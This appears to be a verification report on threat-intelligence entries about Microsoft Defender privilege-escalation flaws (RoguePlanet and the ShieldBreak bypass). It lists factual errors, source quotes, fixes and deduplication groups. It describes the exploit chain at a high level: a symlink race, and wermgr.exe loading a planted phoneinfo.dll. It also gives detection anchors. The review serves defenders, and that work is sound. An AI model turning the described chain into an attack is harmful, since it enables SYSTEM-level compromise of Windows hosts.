   - Ground truth: MSRC FAQ: 'Microsoft typically releases an update for the Microsoft Malware Protection Engine once a month or as needed to protect against new threats. Microsoft also typically updates the malware definitions three times daily'. (https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-50656)
   - Fix: Say the engine updates monthly/as needed through the default automatic channel.
2. **[imprecision] body para 1**
   - Claim: a local privilege-escalation vulnerability (CWE-59 ...) in the Microsoft Malware Protection Engine that underpins Microsoft Defender, System Center Endpoint Protection and Microsoft Security Essentials ([NCSC-CH, 2026-07-09]) ... describing a race condition in Defender that lets a local attacker "execute arbitrary code or spawn a command shell with SYSTEM-level privileges"
   - Defect: Adjacency: NCSC-CH's 2026-07-09 update says only 'A CVE was published for RoguePlanet'; CWE-59 and the System Center Endpoint Protection / Security Essentials scope come from the MSRC page, and the quoted sentence is NCSC-CH's own summary of the exploit, not the researcher's words as the sentence implies.
   - Ground truth: NCSC-CH post 12622: 'Update 09.07.2026 - A CVE was published for RoguePlanet'; MSRC FAQ: 'Yes, Microsoft System Center Endpoint Protection ... and Microsoft Security Essentials'. (https://security-hub.ncsc.admin.ch/#/posts/12622)
   - Fix: Re-attribute CWE-59 and the product list to MSRC and the quote to NCSC-CH.
3. **[imprecision] actions[0] and 'This closes RoguePlanet specifically'**
   - Claim: verify the installed Malware Protection Engine build is ≥ 1.1.26060.3008 ... This closes RoguePlanet specifically
   - Defect: Insufficient on today's facts: the follow-on bypass CVE-2026-69414 (ShieldBreak, public PoC, reproduced by LevelBlue on fully patched Windows) affects engines up to 1.26070.7 and was fixed only in 1.1.26080.3 (MSRC revision 2026-09-03), so an estate verified at 1.1.26060.3008 is still exposed; the entry does not mention the bypass.
   - Ground truth: MSRC CVE-2026-69414: 'Last version ... affected by this vulnerability 1.26070.7; First version ... with this vulnerability addressed 1.1.26080.3' (latest revision 2026-09-03). (https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69414)
   - Fix: Fold into the survivor; set the engine check to >= 1.1.26080.3 and cross-reference CVE-2026-69414.
4. **[imprecision] body, **Triage:** line**
   - Claim: the exploit abuses a symlink/junction race against files Defender is actively scanning, so the telemetry class is symlink/junction creation targeting Defender scan paths and ... `MsMpEng.exe` spawning an unexpected child process with a SYSTEM token
   - Defect: Uncited; neither NCSC-CH nor MSRC describes the technique (MSRC: CWE-59 link following). Later analysis of the successor chain shows an object-manager symlink, not a junction, and SYSTEM code execution through wermgr.exe rather than a child of the engine.
   - Ground truth: MSRC: 'Improper link resolution before file access ("link following") in Microsoft Defender allows an authorized attacker to elevate privileges locally.' LevelBlue (ShieldBreak): 'without requiring an NTFS junction'; 'causes wermgr.exe to process the report, loading phoneinfo.dll'. (https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-50656)
   - Fix: Cite a source for the RoguePlanet telemetry class or soften to a hypothesis.
5. **[imprecision] frontmatter**
   - Claim: classification: null; confidence: medium; priority: notable
   - Defect: No Admiralty rating although the sourcing is vendor-primary (MSRC) plus a national CERT.
   - Ground truth: n/a (metadata). (https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-50656)
   - Fix: Populate on the survivor.

### 2026-08-12/shieldbreak-defender-rogueplanet-patch-bypass-no-fix — factual-error
1. **[factual-error] ## Update — 2026-08-18 'Detection' and 'Triage' paragraphs**
   - Claim: the Malware Protection Engine has no legitimate reason to be the parent of an interactive shell or an unexpected child process, so any such process tree rooted at the engine is the signal irrespective of which variant produced it ... a shell parented to it does not have a benign counterpart
   - Defect: Wrong anchor for this chain, contradicted by the entry's own later sections and by LevelBlue: the engine writes the DLL and SYSTEM execution comes from wermgr.exe loading it after QueueReporting; no engine-parented shell is part of the published chain, so the 08-18 anchor would miss it. The later sections never retract it.
   - Ground truth: LevelBlue: 'The task runs as SYSTEM and causes wermgr.exe to process the report, loading phoneinfo.dll from System32'; 'telemetry can show MsMpEng.exe as the process responsible for the file write. That is expected from the exploit's design'. (https://www.levelblue.com/blogs/spiderlabs-blog/cloud-sync-root-registrationshieldbreak-hunting-windows-defender-remediation-abuse-and-cloud-files-hijacking)
   - Fix: Mark the 08-18 anchor superseded by the 08-21/08-24 mechanism, or remove it.
2. **[imprecision] body para 3, 08-18 and 08-21 'Defender takeaway' lines, 08-24 Triage**
   - Claim: no technical analysis of ShieldBreak itself has been published. / Nothing to patch yet, and no reason to raise urgency beyond that ... / there is still nothing to patch ... / application-control policies have nothing third-party to key on
   - Defect: Statements disproved by later sections or the entry's own sources and left unflagged: LevelBlue published the full mechanism on 2026-08-19; Microsoft shipped the fix on 2026-09-03 (engine 1.1.26080.3); and the same entry cites ThreatLocker that application allowlisting blocked RoguePlanet by default and is 'the strongest control available for this bug class'.
   - Ground truth: MSRC CVE-2026-69414 revision 2 (2026-09-03): 'Microsoft has released an update to the Microsoft Malware Protection Engine that addresses the vulnerability'; Cyber Kendra: 'ThreatLocker found that application allowlisting blocked RoguePlanet by default, the strongest control available for this bug class.' (https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69414)
   - Fix: Qualify each sentence as of its date or delete; reconcile the allowlisting statement.
3. **[imprecision] cves[CVE-2026-50656].fixed, body para 3**
   - Claim: Engine build 1.1.26060.3008, shipped 2026-07-09 / was fixed in engine build 1.1.26060.3008 on 2026-07-09
   - Defect: Microsoft's own record dates the update 2026-07-08 (revision 2); 07-09 is the date of Cyber Kendra/The Register reporting.
   - Ground truth: MSRC revisions for CVE-2026-50656: 'version 2, 2026-07-08, Microsoft has released an update to the Microsoft Malware Protection Engine'. (https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-50656)
   - Fix: Use 2026-07-08 (MSRC) and cite MSRC.
4. **[imprecision] summary**
   - Claim: it is listed as tested on Windows Server 2025 alongside Windows 11 25H2, where the June exploit did not run
   - Defect: Cyber Kendra says the June exploit did not run on Windows Server (standard users cannot mount ISO images); the clause as written attaches the failure to Windows 11 25H2.
   - Ground truth: 'The June exploit did not run on Windows Server, because standard users cannot mount ISO images there ... ShieldBreak is now listed as tested on Windows Server 2025, alongside Windows 11 25H2 and the Canary channel.' (https://www.cyberkendra.com/2026/08/shieldbreak-poc-bypasses-microsofts.html)
   - Fix: Re-word: 'on Windows Server 2025 (where the June exploit did not run) as well as Windows 11 25H2'.
5. **[imprecision] ## Update — 2026-09-13T15:10:00Z, para 2**
   - Claim: described in the researcher's own repository as a partial rather than total bypass ... ([Nightmare Eclipse, 2026-09-08](https://github.com/MSNightmare/ShieldCrash))
   - Defect: The cited repository URL returns 404 today (raw README also 404), so the citation no longer resolves; the quote itself is verbatim in BleepingComputer and The Hacker News, but 'partial rather than total' appears in none of the reachable sources (it is a gloss on 'under specific conditions').
   - Ground truth: BleepingComputer (2026-09-09): "Microsoft has failed to properly patch ShieldBreak CVE-2026-69414, under specific conditions it is still possible to trigger the exact same problem that was caused by ShieldBreak. While Microsoft fixed several things ... they missed a spot where ShieldBreak can still be exploited," they said. (https://www.bleepingcomputer.com/news/security/new-microsoft-defender-shieldcrash-zero-day-grants-system-access/)
   - Fix: Cite BleepingComputer/The Hacker News for the quote and drop 'partial rather than total'.
6. **[imprecision] frontmatter techniques[], affected_products[], cves[CVE-2026-69414].affected**
   - Claim: techniques: T1068, T1548, T1036.005, T1574.001, T1218, T1053.005, T1685, T1106, T1070.004, T1027.007; affected_products: Microsoft Defender Antivirus, Windows 11, Windows Server 2025, Microsoft Defender, Microsoft Malware Protection Engine, Microsoft Windows Defender; affected: 'Windows 11 24H2 and Windows Server 2025 ... fully patched as of the August 2026 updates'
   - Defect: All ids are active in ATT&CK v20, but T1548 is not described by any source and LevelBlue maps the DLL load to T1574.002 (side-loading), not T1574.001; affected_products repeats Defender three ways and lists operating systems although MSRC scopes the flaw to the Malware Protection Engine up to 1.26070.7; the 'affected' text restates LevelBlue's test matrix.
   - Ground truth: LevelBlue ATT&CK table: 'T1574.002 DLL Side-Loading | phoneinfo.dll planted in System32, loaded by wermgr.exe'. MSRC: 'Last version of the Microsoft Malware Protection Engine affected by this vulnerability 1.26070.7'. (https://www.levelblue.com/blogs/spiderlabs-blog/cloud-sync-root-registrationshieldbreak-hunting-windows-defender-remediation-abuse-and-cloud-files-hijacking)
   - Fix: Drop T1548, use T1574.002, dedupe affected_products to Microsoft Defender / Malware Protection Engine, set affected to engine <= 1.26070.7.
7. **[imprecision] sourcing_note, classification, actions[1]**
   - Claim: Both sources report the researcher's own claims ... The reliability rating reflects Rapid7 as the higher-reliability of the two; the credibility number ... so far uncorroborated by any vendor or independent analysis. / Hunt for C:\Windows\System32\phoneinfo.dll
   - Defect: Stale and workflow-worded: seven sources are listed, MSRC acknowledged and fixed the CVE, and LevelBlue reproduced the chain (including Server 2025); 'reliability rating' and 'credibility number' are pipeline vocabulary in a reader-facing note. phoneinfo.dll, the WD_SCAN link name and the hard-coded pipe/provider strings are file-name/string indicators in an entry that must carry no IOCs. priority high on a patched, locally exploitable, not-exploited flaw no longer clears the high bar.
   - Ground truth: LevelBlue: 'reviewed and reproduced the complete ShieldBreak exploitation chain with the August 2026 Patch Tuesday updates installed'; MSRC: exploited 'No', fixed 2026-09-03. (https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69414)
   - Fix: Rewrite sourcing_note to two sentences of provenance; replace the file-name hunt with the module-load/behavioural anchors; reassess priority.
8. **[imprecision] ## Update — 2026-08-18T04:45:00Z, para 1**
   - Claim: on the fix, Microsoft states only that "We are working to provide a high quality security update that addresses this vulnerability."
   - Defect: Could not be re-verified: MSRC's record for CVE-2026-69414 is now at revision 2 (fix) and the revision-1 text is not retrievable; the same wording is confirmed by Help Net Security for CVE-2026-50656 only. Recorded as unreadable, not as false.
   - Ground truth: MSRC revisions: '1 2026-08-14 Information published; 1.1 2026-08-19 CWE added; 2 2026-09-03 Microsoft has released an update'. (https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69414)
   - Fix: None required if the revision-1 wording was captured at the time; otherwise soften.

### Groups (summary; full records in truth-D3.yaml)
- Group 1: same_finding=True; survivor `2026-05-12/palo-alto-pan-os-cve-2026-0300-first-wave-fixed-builds-now-s`; members: `2026-05-12/palo-alto-pan-os-cve-2026-0300-first-wave-fixed-builds-now-s`, `2026-05-14/cve-2026-0300-pan-os-captive-portal-patch-wave-2-delayed-to`, `2026-05-18/cve-2026-0300-pan-os-captive-portal-revised-fix-release-time`, `2026-05-08/cve-2026-0300-pan-os-captive-portal-unauthenticated-root-rce`, `2026-05-09/cve-2026-0300-palo-alto-pan-os-captive-portal-kev-deadline-t`
- Group 2a: same_finding=True; survivor `2026-05-15/cve-2026-42945-nginx-open-source-plus-f5-waf-products-18-yea`; members: `2026-05-15/cve-2026-42945-nginx-open-source-plus-f5-waf-products-18-yea`, `2026-05-18/cve-2026-42945-nginx-rift-in-the-wild-exploitation-confirmed`
- Group 2b: same_finding=False; survivor `2026-08-12/sap-august-2026-cve-2026-58231-commerce-cloud-data-hub-rce`; members: `2026-08-12/sap-august-2026-cve-2026-58231-commerce-cloud-data-hub-rce`, `2026-05-15/cve-2026-42945-nginx-open-source-plus-f5-waf-products-18-yea`
- Group 3: same_finding=True; survivor `2026-05-25/cve-2026-26980-ghost-cms-content-api-unauthenticated-blind-s`; members: `2026-05-25/cve-2026-26980-ghost-cms-content-api-unauthenticated-blind-s`, `2026-05-25/ghost-cms-cve-2026-26980-clickfix-the-cms-compromise-to-endp`, `2026-05-25/large-scale-clickfix-campaign-mass-compromises-self-hosted-g`
- Group 4: same_finding=True; survivor `2026-05-30/cve-2026-0257-palo-alto-pan-os-globalprotect-pre-auth-authen`; members: `2026-05-30/cve-2026-0257-pan-os-globalprotect-pre-auth-vpn-authenticati`, `2026-05-30/cve-2026-0257-palo-alto-pan-os-globalprotect-pre-auth-authen`
- Group 5: same_finding=True; survivor `2026-06-24/cve-2026-20230-cisco-unified-cm-webdialer-ssrf-to-arbitrary`; members: `2026-06-04/cve-2026-20230-cisco-unified-communications-manager-unauthen`, `2026-06-24/cve-2026-20230-cisco-unified-cm-webdialer-ssrf-to-arbitrary`
- Group 6: same_finding=True; survivor `2026-06-14/cve-2026-20253-splunk-enterprise-unauthenticated-pre-auth-rc`; members: `2026-06-14/cve-2026-20253-splunk-enterprise-unauthenticated-pre-auth-rc`, `2026-06-14/splunk-enterprise-cve-2026-20253-pre-auth-rce-in-the-siem-vi`
- Group 7a: same_finding=True; survivor `2026-07-09/ncsc-ch-rogueplanet-cve-2026-50656-defender-lpe-fixed`; members: `2026-06-19/nightmare-chaotic-eclipse-zero-day-wave-the-defender-lpe-now`, `2026-07-09/ncsc-ch-rogueplanet-cve-2026-50656-defender-lpe-fixed`
- Group 7b: same_finding=False; survivor `2026-08-12/shieldbreak-defender-rogueplanet-patch-bypass-no-fix`; members: `2026-08-12/shieldbreak-defender-rogueplanet-patch-bypass-no-fix`, `2026-07-09/ncsc-ch-rogueplanet-cve-2026-50656-defender-lpe-fixed`, `2026-06-19/nightmare-chaotic-eclipse-zero-day-wave-the-defender-lpe-now`

### Unreadable claims and pass notes
- `unreadable`: F5 advisory K000161019 (myF5 shell on extract, raw and WebFetch; facts cross-checked via the F5 CNA CVE record, nginx.org, NCSC-CH, depthfirst); MSRC revision-1 sentence "We are working to provide a high quality security update" for CVE-2026-69414 (record now at revision 2); github.com/MSNightmare/ShieldCrash (404; the quote was confirmed verbatim in BleepingComputer and The Hacker News).
- Historical PSIRT page states for CVE-2026-0300 (05-12 to 05-18) could not be read from the Wayback Machine (egress blocked, jina drops tables); the original ETA table was confirmed from Rapid7's ETR (published 2026-05-06) and the PSIRT JSON timeline.
- Shared-scratchpad collision: another batch (L) invoked the D3 helper `addc.py` from the shared scratchpad and appended its rows to `truth-D3.claims.yaml`; that was cleaned (the file now holds exactly the 373 D3 ledger ids once each). Three stray L rows that remained (claim ids 9694912561, 7890800779, 7473308233) are in `truth-L.claims.recovered-from-D3.yaml`. The D3 helpers `addc.py`/`adde.py` in the scratchpad were disabled to stop further cross-writes.
- Policy-level issues common to all 16 entries (migrated format): classification absent on 14 of 16 (only the SAP and ShieldBreak entries carry one), techniques[] empty on 13 of 16, evidence quotes on migrated entries are the entry's own text.
